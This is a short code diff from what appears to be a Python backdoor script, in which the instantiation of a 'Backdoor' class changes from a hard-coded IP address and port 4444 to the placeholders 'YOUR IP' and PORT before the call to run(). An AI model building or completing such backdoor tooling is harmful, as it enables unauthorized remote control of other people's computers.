@@ -63,7 +63,7 @@ class Backdoor:
 
 
 
-my_backdoor = Backdoor("192.168.150.138", 4444)
+my_backdoor = Backdoor("YOUR IP", PORT)
 my_backdoor.run()
 
 
